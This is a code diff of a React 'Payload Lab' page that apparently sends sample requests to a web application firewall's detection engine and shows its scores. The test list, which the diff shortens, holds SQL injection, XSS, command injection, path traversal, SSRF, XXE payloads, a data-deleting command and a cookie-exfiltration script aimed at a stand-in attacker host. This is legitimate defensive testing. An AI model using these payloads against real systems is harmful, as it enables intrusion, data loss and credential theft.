@@ -1,355 +1,174 @@
 import React, { useState } from "react";
 import { decisionAPI } from "../services/api";
 import Loader from "../components/Loader";
+import Button from "../components/ui/Button";
+
+const testPayloads = [
+  ["Normal query", "/api/books?search=harry+potter&page=1"],
+  ["SQL injection", "' OR '1'='1' --"],
+  ["Stacked SQL", "1; DROP TABLE users; --"],
+  ["XSS script", '<script>alert("XSS")</script>'],
+  ["Encoded XSS", "%3Cscript%3Ealert('xss')%3C%2Fscript%3E"],
+  ["Command injection", "username=admin; cat /etc/passwd"],
+  ["Path traversal", "../../../../../etc/passwd"],
+  ["SSRF metadata", "http://169.254.169.254/latest/meta-data/"],
+  ["NoSQL injection", '{"$ne": null}'],
+  ["Mixed vector", "search=<script>document.cookie</script>&id=123 OR 1=1 --"],
+];
+
+const scoreColor = (score) => {
+  if (score >= 0.75) return "bg-rose-500";
+  if (score >= 0.5) return "bg-amber-500";
+  return "bg-emerald-500";
+};
 
 const TestPayload = () => {
-  const [formData, setFormData] = useState({
-    ip: "192.168.1.100",
-    payload: "",
-  });
+  const [formData, setFormData] = useState({ ip: "192.168.1.100", payload: "" });
   const [result, setResult] = useState(null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(null);
 
-  const testPayloads = [
-    {
-      name: "Normal - Query",
-      payload: "/api/books?search=harry+potter&page=1",
-    },
-    { name: "Normal - Empty", payload: "" },
-    { name: "SQL Injection - classic", payload: "' OR '1'='1' --" },
-    { name: "SQL Injection - stacked", payload: "1; DROP TABLE users; --" },
-    { name: "XSS - plain script", payload: '<script>alert("XSS")</script>' },
-    {
-      name: "XSS - encoded",
-      payload: "%3Cscript%3Ealert('xss')%3C%2Fscript%3E",
-    },
-    {
-      name: "Reflected XSS - DOM",
-      payload: "<img src=x onerror=alert(document.cookie) />",
-    },
-    {
-      name: "Command Injection",
-      payload: "username=admin; rm -rf /tmp/uploads || true",
-    },
-    { name: "Path Traversal / LFI", payload: "../../../../../etc/passwd" },
-    {
-      name: "SSRF - metadata access",
-      payload:
-        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    },
-    {
-      name: "Local File Inclusion (URL param)",
-      payload: "file=/var/www/html/config.php",
-    },
-    { name: "NoSQL Injection (Mongo) ", payload: '{"$ne": null}' },
-    {
-      name: "XML External Entity (XXE)",
-      payload:
-        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
-    },
-    {
-      name: "High-entropy / Fuzzed",
-      payload: "dGhpcy1pcy1hLXRlc3QtYmFzZTY0LXN0cmluZzpleGFtcGxl",
-    },
-    {
-      name: "URL with suspicious params",
-      payload: "/redirect?url=http://malicious.example.com",
-    },
-    {
-      name: "Directory Traversal in filename",
-      payload: "image=..%2F..%2F..%2Fsecret%2Ftoken.txt",
-    },
-    { name: "Server-side template injection", payload: "{{7*7}}" },
-    { name: "HTTP header fuzz", payload: '\'; exec("ls -la") // ' },
-    {
-      name: "Cookie exfil attempt",
-      payload:
-        "<script>fetch('https://attacker.example/?c='+document.cookie)</script>",
-    },
-    {
-      name: "Mixed vector (SQLi + XSS)",
-      payload: "search=<script>document.cookie</script>&id=123 OR 1=1 --",
-    },
-  ];
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
+  const handleSubmit = async (event) => {
+    event.preventDefault();
     setLoading(true);
     setError(null);
     setResult(null);
 
     try {
       const response = await decisionAPI.analyze(formData);
-      console.log(response.data);
-
-      const prediction = response.data.log.prediction || {};
-      const modelScores = {
-        payload: prediction.payload ?? 0,
-        bot: prediction.bot ?? 0,
-        ddos: prediction.ddos ?? 0,
-        behavior: prediction.behavior ?? 0,
-        xss: prediction.xss ?? 0,
-      };
-
+      const log = response.data.log || {};
+      const prediction = log.prediction || {};
       setResult({
-        ...response.data.log,
-        modelScores,
-        features: prediction.features || {},
+        ...log,
+        effectiveDecision: response.data.effectiveDecision,
+        modelScores: {
+          rules: prediction.rules ?? 0,
+          payload: prediction.payload ?? 0,
+          xss: prediction.xss ?? 0,
+          bot: prediction.bot ?? 0,
+          ddos: prediction.ddos ?? 0,
+          behavior: prediction.behavior ?? 0,
+        },
+        ruleMatches: prediction.ruleMatches || [],
+        detectorStatus: prediction.detectorStatus || [],
       });
     } catch (err) {
-      setError(err.response?.data?.message || "Failed to analyze payload");
+      setError(err.response?.data?.error || "Failed to analyze payload.");
     } finally {
       setLoading(false);
     }
   };
 
-  const loadTestPayload = (payload) => setFormData({ ...formData, payload });
-
   return (
-    <div className="max-w-7xl mx-auto space-y-6 animate-fadeIn p-4">
-      {/* Header */}
-      <div className="flex justify-between items-center">
+    <div className="animate-fadeIn space-y-6">
+      <div className="page-header">
         <div>
-          <h1 className="text-4xl font-bold bg-linear-to-r from-primary-400 to-primary-600 bg-clip-text text-transparent">
-            Test Payload
-          </h1>
-          <p className="text-gray-400 mt-1">
-            Test normal and malicious payloads against your AI detection system.
-          </p>
+          <h1 className="page-title">Payload Lab</h1>
+          <p className="page-subtitle">Send controlled payloads through the WAF decision engine.</p>
         </div>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-        {/* Left Panel - Input Form */}
-        <div className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl shadow-xl p-6">
-          <h2 className="text-xl font-bold text-gray-200 mb-4 flex items-center gap-2">
-            🎯 Input
-          </h2>
-
+      <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
+        <section className="panel p-5">
+          <h2 className="panel-title mb-5">Request Input</h2>
           <form onSubmit={handleSubmit} className="space-y-4">
-            {/* IP Input */}
             <div>
-              <label className="block text-sm font-medium text-gray-300 mb-2">
-                IP Address
-              </label>
+              <label className="label">IP Address</label>
               <input
-                type="text"
+                className="input"
                 value={formData.ip}
-                onChange={(e) =>
-                  setFormData({ ...formData, ip: e.target.value })
-                }
-                className="w-full px-4 py-2 bg-gray-900 border border-gray-600 text-gray-200 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-transparent transition-all"
+                onChange={(event) => setFormData({ ...formData, ip: event.target.value })}
                 required
               />
             </div>
-
-            {/* Payload Input */}
             <div>
-              <label className="block text-sm font-medium text-gray-300 mb-2">
-                Payload
-              </label>
+              <label className="label">Payload</label>
               <textarea
+                className="textarea min-h-36 font-mono text-sm"
                 value={formData.payload}
-                onChange={(e) =>
-                  setFormData({ ...formData, payload: e.target.value })
-                }
-                className="w-full px-4 py-2 bg-gray-900 border border-gray-600 text-gray-200 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-transparent h-32 font-mono text-sm"
-                placeholder="Enter payload to test..."
+                onChange={(event) => setFormData({ ...formData, payload: event.target.value })}
+                placeholder="Enter request payload"
                 required
               />
             </div>
-
-            {/* Submit Button */}
-            <button
-              type="submit"
-              disabled={loading}
-              className="w-full bg-linear-to-r from-primary-600 to-primary-700 text-white py-3 px-4 rounded-lg hover:from-primary-700 hover:to-primary-800 disabled:opacity-50 transition-all font-medium shadow-lg hover:shadow-xl hover:shadow-primary-600/50 transform hover:-translate-y-0.5"
-            >
-              {loading ? "Analyzing..." : "🔍 Analyze Payload"}
-            </button>
+            <Button type="submit" className="w-full" disabled={loading}>
+              {loading ? "Analyzing..." : "Analyze payload"}
+            </Button>
           </form>
 
-          {/* Quick Payloads */}
           <div className="mt-6">
-            <h3 className="text-sm font-medium text-gray-300 mb-3 flex items-center gap-2">
-              ⚡ Quick Test Payloads
-            </h3>
-            <div className="space-y-2 max-h-96 overflow-y-auto pr-2 custom-scrollbar">
-              {testPayloads.map((test) => (
+            <h3 className="mb-3 text-sm font-bold text-[var(--app-text)]">Quick payloads</h3>
+            <div className="max-h-80 space-y-2 overflow-y-auto pr-1">
+              {testPayloads.map(([name, payload]) => (
                 <button
-                  key={test.name}
-                  onClick={() => loadTestPayload(test.payload)}
-                  className="w-full text-left px-3 py-2 bg-gray-900/50 border border-gray-700 hover:border-primary-600 hover:bg-gray-900 rounded-lg text-sm transition-all group"
+                  key={name}
+                  type="button"
+                  onClick={() => setFormData({ ...formData, payload })}
+                  className="w-full rounded-lg border border-[var(--app-border)] bg-[var(--app-surface-muted)] px-3 py-2 text-left transition hover:border-[var(--app-primary)]"
                 >
-                  <span className="font-medium text-gray-300 group-hover:text-primary-400">
-                    {test.name}
-                  </span>
-                  <p className="text-xs text-gray-500 font-mono truncate mt-1">
-                    {test.payload}
-                  </p>
+                  <span className="block text-sm font-semibold text-[var(--app-text)]">{name}</span>
+                  <span className="block truncate font-mono text-xs text-[var(--app-text-muted)]">{payload}</span>
                 </button>
               ))}
             </div>
           </div>
-        </div>
+        </section>
 
-        {/* Right Panel - Results */}
-        <div className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl shadow-xl p-6">
-          <h2 className="text-xl font-bold text-gray-200 mb-4 flex items-center gap-2">
-            📊 Results
-          </h2>
-
+        <section className="panel p-5">
+          <h2 className="panel-title mb-5">Analysis Result</h2>
           {loading && <Loader text="Analyzing payload..." />}
+          {error && <div className="panel-muted px-4 py-3 text-sm text-[var(--app-danger)]">{error}</div>}
 
-          {error && (
-            <div className="bg-danger-900/30 border border-danger-600 text-danger-300 px-4 py-3 rounded-lg animate-shake">
-              {error}
+          {!loading && !error && !result && (
+            <div className="py-16 text-center text-[var(--app-text-muted)]">
+              Submit a payload to see the decision, model scores, and rule matches.
             </div>
           )}
 
           {!loading && result && (
-            <div className="space-y-6">
-              {/* Decision Badge */}
-              <div className="flex justify-center">
-                <span
-                  className={`px-6 py-3 text-lg font-bold rounded-full shadow-xl ${
-                    result.decision === "block"
-                      ? "bg-danger-600 text-white border-2 border-danger-400 shadow-danger-600/50 animate-pulse"
-                      : result.decision === "alert"
-                      ? "bg-warning-600 text-white border-2 border-warning-400 shadow-warning-600/50"
-                      : "bg-success-600 text-white border-2 border-success-400 shadow-success-600/50"
-                  }`}
-                >
-                  {result.decision?.toUpperCase()}
+            <div className="space-y-5">
+              <div className="flex items-center justify-between rounded-lg border border-[var(--app-border)] bg-[var(--app-surface-muted)] p-4">
+                <span className="text-sm font-semibold text-[var(--app-text-muted)]">Decision</span>
+                <span className={`badge ${result.decision === "block" ? "badge-block" : result.decision === "alert" ? "badge-alert" : "badge-allow"}`}>
+                  {result.decision || "allow"}
                 </span>
               </div>
 
-              {/* Threat Score */}
-              <div className="bg-gray-900/50 border border-gray-700 rounded-lg p-4">
-                <p className="text-sm text-gray-400 mb-1">Threat Score</p>
-                <div className="flex items-center gap-3">
-                  <div className="flex-1 bg-gray-700 rounded-full h-4">
-                    <div
-                      className={`h-4 rounded-full transition-all ${
-                        result.threatScore > 0.7
-                          ? "bg-danger-600"
-                          : result.threatScore > 0.4
-                          ? "bg-warning-600"
-                          : "bg-success-600"
-                      }`}
-                      style={{ width: `${result.threatScore * 100}%` }}
-                    ></div>
-                  </div>
-                  <span className="text-lg font-bold text-white">
-                    {(result.threatScore * 100).toFixed(1)}%
-                  </span>
+              <div>
+                <div className="mb-2 flex justify-between text-sm">
+                  <span className="font-semibold text-[var(--app-text)]">Threat score</span>
+                  <span className="text-[var(--app-text-muted)]">{((result.threatScore || 0) * 100).toFixed(1)}%</span>
+                </div>
+                <div className="progress-track">
+                  <div className={`progress-fill ${scoreColor(result.threatScore || 0)}`} style={{ width: `${Math.min((result.threatScore || 0) * 100, 100)}%` }} />
                 </div>
               </div>
 
-              {/* Model Scores */}
-              <div className="bg-gray-900/50 border border-gray-700 rounded-lg p-4 space-y-2">
-                <p className="text-sm font-medium text-gray-300 flex items-center gap-2">
-                  🤖 Model Scores
-                </p>
+              <div className="grid grid-cols-2 gap-3">
                 {Object.entries(result.modelScores).map(([model, score]) => (
-                  <div
-                    key={model}
-                    className="flex justify-between items-center bg-gray-800/40 px-3 py-2 rounded-lg"
-                  >
-                    <span className="text-sm text-gray-300 capitalize">
-                      {model}
-                    </span>
-                    <span
-                      className={`text-sm font-semibold ${
-                        score > 0.7
-                          ? "text-danger-400"
-                          : score > 0.4
-                          ? "text-warning-400"
-                          : "text-success-400"
-                      }`}
-                    >
-                      {(score * 100).toFixed(2)}%
-                    </span>
+                  <div key={model} className="panel-muted p-3">
+                    <div className="text-xs font-semibold uppercase text-[var(--app-text-muted)]">{model}</div>
+                    <div className="mt-1 text-lg font-bold text-[var(--app-text)]">{(score * 100).toFixed(1)}%</div>
                   </div>
                 ))}
               </div>
 
-              {/* Feature Insights */}
-              {result.features && (
-                <div className="bg-gray-900/50 border border-gray-700 rounded-lg p-4 space-y-3">
-                  <p className="text-sm font-medium text-gray-300 flex items-center gap-2">
-                    🧠 Feature Insights
-                  </p>
-                  <div className="grid grid-cols-2 gap-4 text-sm">
-                    <div>
-                      <p className="text-gray-400">Entropy:</p>
-                      <p className="text-primary-400 font-semibold">
-                        {result.features.entropy}
-                      </p>
-                    </div>
-                    <div>
-                      <p className="text-gray-400">Reputation Score:</p>
-                      <p className="text-primary-400 font-semibold">
-                        {result.features.reputation_score}
-                      </p>
-                    </div>
-                    <div>
-                      <p className="text-gray-400">Country:</p>
-                      <p className="text-primary-400 font-semibold">
-                        {result.features.geo?.country || "Unknown"}
-                      </p>
-                    </div>
-                    <div>
-                      <p className="text-gray-400">City:</p>
-                      <p className="text-primary-400 font-semibold">
-                        {result.features.geo?.city || "Unknown"}
-                      </p>
-                    </div>
+              <div className="panel-muted p-4">
+                <h3 className="mb-2 text-sm font-bold text-[var(--app-text)]">Rule matches</h3>
+                {result.ruleMatches.length === 0 ? (
+                  <p className="text-sm text-[var(--app-text-muted)]">No deterministic rules matched.</p>
+                ) : (
+                  <div className="flex flex-wrap gap-2">
+                    {result.ruleMatches.map((match) => (
+                      <span key={match.id} className="badge badge-block">{match.category}: {match.id}</span>
+                    ))}
                   </div>
-
-                  {/* Tokens */}
-                  {result.features.tokens && (
-                    <div>
-                      <p className="text-gray-400 mt-2 mb-1">
-                        Extracted Tokens:
-                      </p>
-                      <div className="flex flex-wrap gap-2">
-                        {result.features.tokens.map((t, i) => (
-                          <span
-                            key={i}
-                            className="px-2 py-1 bg-gray-800 border border-gray-700 text-xs text-gray-300 rounded-lg"
-                          >
-                            {t}
-                          </span>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-                </div>
-              )}
+                )}
+              </div>
             </div>
           )}
-
-          {!result && !loading && !error && (
-            <div className="text-center text-gray-500 py-12">
-              <div className="text-6xl mb-4 opacity-50">📊</div>
-              <p>Submit a payload to see analysis results</p>
-            </div>
-          )}
-        </div>
+        </section>
       </div>
-
-      {/* Custom Scrollbar */}
-      <style jsx>{`
-        .custom-scrollbar::-webkit-scrollbar {
-          width: 6px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-thumb {
-          background: rgb(75, 85, 99);
-          border-radius: 3px;
-        }
-      `}</style>
     </div>
   );
 };
